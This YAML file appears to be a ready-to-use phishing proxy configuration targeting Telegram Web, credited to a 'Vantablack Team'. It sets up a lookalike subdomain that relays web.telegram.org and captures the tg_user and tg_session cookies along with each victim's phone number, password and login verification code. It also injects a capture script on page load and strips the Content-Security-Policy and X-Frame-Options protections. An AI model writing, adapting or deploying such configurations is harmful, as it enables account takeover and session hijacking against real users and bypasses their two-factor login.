name: Telegram Web
author: Vantablack Team
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "web"
    target: "web.telegram.org"

auth_urls:
  - "/auth"
  - "/api/auth"
  - "/login"

landing_path:
  - "/"
  - "/k"
  - "/login"

auth_tokens:
  - type: "cookie"
    name: "tg_user"
    regex: ".*"
  - type: "cookie"
    name: "tg_session"
    regex: ".*"

credentials:
  - type: "post_param"
    name: "phone"
    regex: "^\\+[0-9]{1,15}$"
  - type: "post_param"
    name: "password"
    regex: null
  - type: "post_param"
    name: "verification_code"
    regex: "^[0-9]{5}$"

injections:
  - type: "js"
    path: "/core/assets/js/capture.js"
    trigger: "load"

headers:
  - action: "remove"
    name: "Content-Security-Policy"
  - action: "remove"
    name: "X-Frame-Options"

cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS"]
  headers: ["*"]